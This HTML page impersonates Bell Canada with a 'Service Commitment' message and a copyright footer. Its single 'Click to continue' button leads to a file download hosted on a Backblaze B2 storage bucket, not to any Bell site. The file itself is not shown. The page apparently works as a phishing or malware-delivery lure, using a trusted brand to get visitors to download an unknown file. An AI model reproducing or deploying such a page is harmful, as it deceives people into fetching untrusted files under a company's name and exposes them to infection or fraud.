<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bell - Service Commitment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            background: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: #0055a6;
            padding: 30px 20px;
            text-align: center;
            width: 100%;
        }

        .bell-logo {
            color: white;
            font-size: 48px;
            font-weight: 900;
            letter-spacing: -1px;
        }

        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 60px 20px;
            text-align: center;
            max-width: 800px;
            margin: 0 auto;
        }

        .commitment-text {
            color: #333;
            font-size: 28px;
            line-height: 1.4;
            margin-bottom: 50px;
            font-weight: 500;
            max-width: 600px;
        }

        .continue-button {
            display: inline-block;
            padding: 20px 60px;
            background: #0055a6;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-size: 22px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid #0055a6;
        }

        .continue-button:hover {
            background: #004080;
            border-color: #004080;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 85, 166, 0.4);
        }

        .continue-button:active {
            transform: translateY(0);
        }

        .footer {
            background: #f8f8f8;
            padding: 20px;
            text-align: center;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #e1e1e1;
            width: 100%;
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            .header {
                padding: 25px 20px;
            }
            
            .bell-logo {
                font-size: 36px;
            }
            
            .content {
                padding: 40px 20px;
            }
            
            .commitment-text {
                font-size: 22px;
                margin-bottom: 40px;
            }
            
            .continue-button {
                padding: 18px 50px;
                font-size: 20px;
            }
        }

        @media (max-width: 480px) {
            .bell-logo {
                font-size: 32px;
            }
            
            .commitment-text {
                font-size: 20px;
            }
            
            .continue-button {
                padding: 16px 40px;
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <!-- Header with Bell Logo -->
    <div class="header">
        <div class="bell-logo">Bell</div>
    </div>
    
    <!-- Main Content -->
    <div class="content">
        <p class="commitment-text">
            We are committed to serving canadians and keeping you connected to what matters most.
        </p>
        
        <a href="https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_ze3ba5bce234f7ca692ac021e_f115c0cb577d9ea3c_d20251113_m053624_c005_v0501013_t0003_u01763012184481" class="continue-button">
            Click to continue
        </a>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        © 2023 Bell Canada. All rights reserved.
    </div>

    <script>
        document.querySelector('.continue-button').addEventListener('click', function(e) {
            console.log('Redirecting to Backblaze file download');
        });
    </script>
</body>
</html>
